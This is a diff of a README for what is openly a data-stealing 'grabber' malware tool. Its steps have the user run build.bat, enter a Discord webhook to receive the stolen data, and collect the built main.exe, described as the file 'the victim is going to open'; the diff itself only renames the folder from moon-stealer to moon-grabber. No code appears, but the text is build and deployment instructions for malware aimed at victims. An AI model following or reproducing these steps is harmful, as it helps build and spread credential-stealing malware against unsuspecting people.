@@ -47,7 +47,7 @@
 
 5. For people who pressed n: Rerun build.bat (if you pressed n and installed python) and this time press y and enter your discord webhook.
 
-6. Go to the moon-stealer folder and you will find another folder called "dist", open it and you will see "main.exe" that is your grabber the victim is going to open.
+6. Go to the moon-grabber folder and you will find another folder called "dist", open it and you will see "main.exe" that is your grabber the victim is going to open.
 
 Enjoy!
 
